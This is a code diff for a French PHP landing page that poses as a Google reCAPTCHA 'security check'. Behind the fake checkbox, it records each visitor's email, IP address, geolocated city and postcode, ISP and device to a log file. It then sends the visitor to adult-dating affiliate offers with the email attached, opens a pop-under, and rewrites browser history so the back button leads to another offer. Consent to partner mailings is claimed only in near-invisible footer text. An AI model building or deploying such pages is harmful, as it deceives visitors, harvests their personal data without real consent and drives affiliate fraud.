@@ -1,146 +1,270 @@
+<?php
+session_start();
+
+// ============================================================
+// 1. CONFIGURATION
+// ============================================================
+
+$log_filename = "logs_consent_" . md5('geo_conn_salt_' . date('Y-m')) . ".txt";
+
+// Sauvegarde paramètres
+if (isset($_GET['u'])) { 
+    $raw_u = $_GET['u'];
+    if (filter_var($raw_u, FILTER_VALIDATE_EMAIL)) {
+        $_SESSION['saved_email'] = trim($raw_u);
+    } else {
+        $decoded = base64_decode($raw_u, true);
+        if ($decoded && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
+            $_SESSION['saved_email'] = $decoded;
+        } else {
+            $_SESSION['saved_email'] = $raw_u;
+        }
+    }
+}
+if (isset($_GET['sub1'])) { $_SESSION['saved_sub1'] = $_GET['sub1']; }
+if (isset($_GET['sub2'])) { $_SESSION['saved_sub2'] = $_GET['sub2']; }
+if (isset($_GET['sub3'])) { $_SESSION['saved_sub3'] = $_GET['sub3']; }
+if (isset($_GET['sub4'])) { $_SESSION['saved_sub4'] = $_GET['sub4']; }
+
+$offres = [
+    'offrefr'   => "https://rencontrespouradultes.com/lead/noredir?cid=34870&email=%EMAIL%&clickid=mailing&utm_source=ACgourg",
+    'offrelb'   => "https://ab.pdtrcksus.com/v1/redirect/35449?utm_term=ACgourg&email=%EMAIL%",
+    'offrefr2'   => "https://rencontrespouradultes.com/lead/noredir?cid=34870&email=%EMAIL%&clickid=mailing&utm_source=ACgourg",
+];
+
+// ============================================================
+// 2. FONCTIONS
+// ============================================================
+
+function getRealIp() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+    return $_SERVER['REMOTE_ADDR'];
+}
+
+function prepareUrl($rawUrl) {
+    $email = $_SESSION['saved_email'] ?? '';
+    $url = str_replace('%EMAIL%', rawurlencode($email), $rawUrl);
+    $params = [];
+    if (!empty($_SESSION['saved_sub1'])) $params['sub1'] = $_SESSION['saved_sub1'];
+    if (!empty($_SESSION['saved_sub2'])) $params['sub2'] = $_SESSION['saved_sub2'];
+    if (!empty($_SESSION['saved_sub3'])) $params['sub3'] = $_SESSION['saved_sub3'];
+    if (!empty($_SESSION['saved_sub4'])) $params['sub4'] = $_SESSION['saved_sub4'];
+    if (!empty($params)) {
+        $separator = (strpos($url, '?') !== false) ? '&' : '?';
+        $url .= $separator . http_build_query($params);
+    }
+    return $url;
+}
+
+// --- LOG COMPLET AVEC TYPE DE CONNEXION ---
+function logConsentAction($targetUrl) {
+    global $log_filename;
+    
+    $date = date('Y-m-d H:i:s');
+    $ip = getRealIp();
+    $email = $_SESSION['saved_email'] ?? 'unknown';
+    $userAgentFull = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown Agent';
+    
+    // URL Source
+    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
+    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
+    $uri = $_SERVER['REQUEST_URI'] ?? '';
+    $sourceUrl = $protocol . "://" . $host . $uri;
+
+    // Variables Géo
+    $country='NA'; $city='NA'; $zip='NA'; $region='NA'; $dept='NA'; $isp='NA';
+    $conn_type = 'NA'; // Variable pour stocker Wifi ou Cellulaire
+
+    // DÉTECTION SUPPORT (Matériel)
+    $device = 'Ordinateur';
+    if (preg_match('/mobile|android|iphone/i', $userAgentFull)) $device = 'Mobile';
+    elseif (preg_match('/ipad|tablet/i', $userAgentFull)) $device = 'Tablette';
+
+    // Appel API
+    $callApi = function($u){ 
+        $c=curl_init(); curl_setopt($c,CURLOPT_URL,$u); curl_setopt($c,CURLOPT_RETURNTRANSFER,1); 
+        curl_setopt($c,CURLOPT_TIMEOUT,2); 
+        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
+        $d=curl_exec($c); curl_close($c); 
+        return $d?json_decode($d,true):null; 
+    };
+
+    // TENTATIVE 1 : IP-API (Avec le champ 'mobile')
+    $d = $callApi("http://ip-api.com/json/$ip?fields=status,country,city,zip,regionName,isp,mobile");
+    
+    if ($d && ($d['status']??'')==='success') {
+        $country = $d['country'] ?? 'NA';
+        $city    = $d['city']    ?? 'NA';
+        $zip     = $d['zip']     ?? 'NA';
+        $region  = $d['regionName'] ?? 'NA';
+        $isp     = $d['isp']     ?? 'NA';
+        
+        // DÉTECTION TYPE CONNEXION
+        // Si mobile=true => C'est une IP cellulaire (4G/5G)
+        // Si mobile=false => C'est une IP fixe (ADSL/Fibre) -> Si Device=Mobile alors c'est du WIFI
+        $is_cellular_ip = $d['mobile'] ?? false;
+
+        if ($is_cellular_ip) {
+            $conn_type = 'Cellulaire (4G/5G)';
+        } else {
+            // Si c'est une IP fixe et que c'est un téléphone, c'est forcément du Wifi
+            if ($device === 'Mobile' || $device === 'Tablette') {
+                $conn_type = 'WiFi';
+            } else {
+                $conn_type = 'Fixe (Ethernet/WiFi)';
+            }
+        }
+        
+        // Calcul département
+        if ($country === 'France' && $zip !== 'NA') $dept = substr($zip, 0, 2);
+
+    } else {
+        // BACKUP IPINFO
+        $d = $callApi("http://ipinfo.io/$ip/json");
+        if ($d && !isset($d['error'])) {
+            $country = $d['country'] ?? 'NA';
+            if($country == 'FR') $country = 'France';
+            $city    = $d['city']    ?? 'NA';
+            $zip     = $d['postal']  ?? 'NA';
+            $region  = $d['region']  ?? 'NA';
+            $isp     = $d['org']     ?? 'NA';
+            $conn_type = 'Inconnu (Backup)'; // Ipinfo gratuit ne donne pas le type de connexion
+            
+            if ($country === 'France' && $zip !== 'NA') $dept = substr($zip, 0, 2);
+        }
+    }
+
+    // FORMAT LOG : 
+    // DATE | IP | EMAIL | PAYS | REGION | DEPT | VILLE | ZIP | FAI | CONNEXION | APPAREIL | DEPUIS | VERS
+    $logData = "$date | IP:$ip | EMAIL:$email | PAYS:$country | REGION:$region | DEPT:$dept | VILLE:$city | ZIP:$zip | FAI:$isp | CONNEXION:$conn_type | SUPPORT:$device | DEPUIS:$sourceUrl | VERS:$targetUrl\n";
+    
+    file_put_contents(__DIR__ . "/" . $log_filename, $logData, FILE_APPEND | LOCK_EX);
+}
+
+// ============================================================
+// 3. TRAP & AJAX
+// ============================================================
+
+if (isset($_GET['trap']) && !empty($_GET['trap'])) {
+    $trap_id = $_GET['trap'];
+    if (isset($offres[$trap_id])) {
+        $url = prepareUrl($offres[$trap_id]);
+        header("Location: $url");
+        exit;
+    }
+    header("Location: https://google.com"); exit;
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'get_links') {
+    
+    if (!isset($_SESSION['seen_offers'])) { $_SESSION['seen_offers'] = []; }
+    $all = array_keys($offres);
+    $avail = array_diff($all, $_SESSION['seen_offers']);
+    
+    if (count($avail) < 3) { $_SESSION['seen_offers'] = []; $avail = $all; }
+
+    $keys = array_rand(array_flip($avail), 3);
+    if (!is_array($keys)) $keys = [$keys];
+
+    $urlA = prepareUrl($offres[$keys[0]]);
+    $urlB = prepareUrl($offres[$keys[1]]);
+    $idC  = $keys[2];
+
+    $_SESSION['seen_offers'][] = $keys[0];
+    $_SESSION['seen_offers'][] = $keys[1];
+    $_SESSION['seen_offers'][] = $keys[2];
+
+    logConsentAction($urlA); // Enregistrement avec Géo + Connexion
+
+    echo json_encode(['status'=>'ok', 'url_main'=>$urlA, 'url_pop'=>$urlB, 'id_back'=>$idC]);
+    exit;
+}
+
+// ============================================================
+// 4. AFFICHAGE HTML (CAPTCHA)
+// ============================================================
+?>
 <!DOCTYPE html>
-<html>
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification de Sécurité Requise</title>
+    <meta name="robots" content="noindex, nofollow">
+    <title>Vérification de sécurité</title>
     <style>
-        /* Styles pour garantir que la page prend tout l'espace */
-        body, html {
-            margin: 0; 
-            padding: 0; 
-            height: 100%; 
-            overflow: hidden; 
-            font-family: 'Helvetica Neue', sans-serif; 
-            background: #ffeaa7; /* Couleur de fond jaune pâle */
-            cursor: default;
-        }
-
-        .main-container {
-            height: 100vh; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            position: relative;
-        }
-
-        .content-box {
-            background: white; 
-            padding: 40px 30px; 
-            border-radius: 25px; 
-            text-align: center; 
-            width: 300px; 
-            box-shadow: 0 10px 0 rgba(253, 203, 110, 0.5); 
-            border: 2px solid #fdcb6e; 
-            z-index: 10;
-        }
-
-        .action-btn {
-            width: 70px; 
-            height: 70px; 
-            background: #fff8e1; 
-            border: none; 
-            border-radius: 15px; 
-            font-size: 35px; 
-            cursor: pointer; 
-            transition: 0.2s;
-        }
-
-        /* Effet hover de votre choix (rouge) */
-        .action-btn:hover { 
-            background: #d63031 !important; 
-            transform: scale(1.1) rotate(5deg); 
-            box-shadow: 0 5px 15px rgba(214, 48, 49, 0.3); 
-        }
+        body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f9f9f9; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #555; }
+        .ray-id { font-size: 10px; color: #ccc; margin-bottom: 10px; font-family: monospace; }
+        .captcha-box { background: white; border: 1px solid #d3d3d3; border-radius: 3px; padding: 12px 15px; width: 300px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 4px rgba(0,0,0,0.08); margin-bottom: 20px; }
+        #verifyBtn { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; cursor: pointer; background: white; margin-right: 12px; display: flex; justify-content: center; align-items: center; transition: all 0.2s; }
+        #verifyBtn:hover { border-color: #b2b2b2; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .label-text { font-size: 14px; font-weight: 500; }
+        .footer { position: absolute; bottom: 10px; width: 100%; text-align: center; z-index: 0; }
+        .legal-text { font-size: 9px; color: #d1d1d1; line-height: 1.3; max-width: 300px; margin: 0 auto; }
+        .legal-text a { color: #d1d1d1; text-decoration: none; cursor: text; }
+        .legal-text strong { font-weight: normal; color: #d1d1d1; } 
     </style>
 </head>
 <body>
-
-<div class="main-container">
-    
-    <div class="content-box">
-        
-        <h2 style="font-size: 20px; color: #d35400; margin: 0 0 15px 0; font-weight: 800;">
-            Êtes-vous humain ?
-        </h2>
-        
-        <p style="font-size: 13px; color: #e17055; margin-bottom: 25px;">
-            Cliquez sur le fruit <strong>IDENTIQUE</strong> pour valider le captcha.
-        </p>
-        <div style="font-size: 60px; margin-bottom: 30px;">
-            🍓
+    <div class="ray-id">Ray ID: <?php echo substr(md5(time()), 0, 16); ?> • Security Check</div>
+    <div class="captcha-box">
+        <div style="display: flex; align-items: center;">
+            <div id="verifyBtn">
+                 <div id="spinner" style="width: 14px; height: 14px; border: 2px solid #f3f3f3; border-top: 2px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite; display: none;"></div>
+            </div>
+            <span class="label-text">Je ne suis pas un robot</span>
         </div>
-        
-        <div style="display: flex; justify-content: space-around; gap: 10px;">
-            <button class="action-btn" data-value="banane">
-                🍌
-            </button>
-            <button class="action-btn" data-value="raisin">
-                🍇
-            </button>
-            <button id="correct-fruit-btn" class="action-btn" data-value="fraise">
-                🍓
-            </button>
-        </div>
-        
-        <div style="margin-top: 20px; font-size: 10px; color: #b2bec3; font-weight: bold; letter-spacing: 1px;">
-            SÉCURITÉ ACTIVE
+        <div style="text-align: center;">
+            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M16 30C23.732 30 30 23.732 30 16C30 8.26801 23.732 2 16 2C8.26801 2 2 8.26801 2 16C2 23.732 8.26801 30 16 30Z" stroke="#4285F4" stroke-width="2"/>
+                <path d="M21 16L14 23L11 20" stroke="#4285F4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <div style="font-size: 10px; color: #999; margin-top: 2px;">reCAPTCHA</div>
+            <div style="font-size: 8px; color: #ccc;">Privacy - Terms</div>
         </div>
     </div>
-    
-    <div style="position: absolute; bottom: 20px; width: 100%; text-align: center; font-size: 10px; color: #d35400; line-height: 1.5; padding: 0 20px; box-sizing: border-box;">
-        &copy; 2025 Gateway Security. <br>
-        En validant, vous acceptez nos CGU.
+    <div class="footer">
+        <div class="legal-text">
+            &copy; <?php echo date('Y'); ?> Gateway Security. <br><br>
+            En validant la sécurité, vous acceptez nos <a href="#">CGU</a> et la réception 
+            d'<strong>actualités exclusives</strong> de nos partenaires certifiés. 
+            Données protégées. Désinscription possible à tout moment.
+            <br><br>
+            <a href="#">Confidentialité</a> • <a href="#">Mentions</a>
+        </div>
     </div>
-
-</div>
-
-<script>
-    var redirected = false;
-
-    function getUrlParameter(name) {
-        // Fonction pour récupérer les paramètres d'URL
-        name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
-        var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
-        // Dans GitHub Pages, le parsing est fait sur l'URL standard (location.search)
-        var results = regex.exec(location.search); 
-        return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
-    };
-
-    function handleRedirection() {
-        if (redirected) return;
-        redirected = true;
-
-        // 1. Récupérer le paramètre de tracking (Ex: si l'URL est ...?subid=USER123)
-        var trackingId = getUrlParameter('subid') || 'default_heat';
-        
-        // 2. 🎯 DESTINATION FINALE : REMPLACER ICI PAR VOTRE VRAI NDD À CHAUFFER !
-        var finalUrl = "https://icietpartout.fr/?subid=" + trackingId;
-        
-        // 3. Redirection FORCÉE en plein écran. Fonctionne sur GitHub Pages.
-        window.top.location.replace(finalUrl);
-    }
-    
-    document.addEventListener('DOMContentLoaded', function() {
-        const correctButton = document.getElementById('correct-fruit-btn');
-        
-        if (correctButton) {
-            // Seul le bouton "Fraise" déclenche la redirection
-            correctButton.addEventListener('click', handleRedirection);
-        }
-
-        // Empêcher les autres boutons de faire quoi que ce soit
-        const incorrectButtons = document.querySelectorAll('.action-btn');
-        incorrectButtons.forEach(btn => {
-            if (btn.id !== 'correct-fruit-btn') {
-                btn.addEventListener('click', (e) => {
-                    e.preventDefault(); // Empêche le navigateur de remonter/tenter de naviguer
-                    e.stopPropagation(); // Arrête l'événement de remonter au body
-                });
+    <script>
+    document.getElementById('verifyBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        if (!e.isTrusted) return;
+        var btn = this;
+        var spinner = document.getElementById('spinner');
+        btn.style.borderColor = "transparent";
+        spinner.style.display = "block";
+        var formData = new FormData();
+        formData.append('action', 'get_links'); 
+        fetch('index.php', { method: 'POST', body: formData })
+        .then(response => response.json())
+        .then(data => {
+            if (data.status === 'ok') {
+                var trapUrl = window.location.pathname + "?trap=" + data.id_back;
+                history.pushState({}, "", trapUrl);
+                try {
+                    var pop = window.open(data.url_pop, '_blank');
+                    if(pop) { pop.blur(); window.focus(); }
+                } catch(e) {}
+                setTimeout(function(){
+                    spinner.style.display = 'none';
+                    btn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#009432" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
+                    setTimeout(() => { window.location.href = data.url_main; }, 300); 
+                }, 800); 
+            } else {
+                location.reload();
             }
-        });
+        })
+        .catch(err => { spinner.style.display = 'none'; btn.style.borderColor = "#c1c1c1"; });
     });
-</script>
-
+    </script>
 </body>
 </html>
